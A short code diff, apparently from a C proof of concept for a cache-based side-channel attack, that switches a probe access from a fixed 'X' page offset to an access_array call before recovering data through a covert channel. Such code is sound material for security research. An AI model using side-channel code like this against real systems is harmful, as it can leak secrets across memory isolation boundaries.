@@ -124,8 +124,8 @@ int main(int argc, const char **argv) {
     _mm_mfence();
 
     // overwrite value with X, then access
-    //access_array(j);
-    maccess(mem + 'X'*4096);
+    access_array(j);
+    //maccess(mem + 'X'*4096);
 
     _mm_mfence(); // avoid speculation
     // Recover data from covert channel
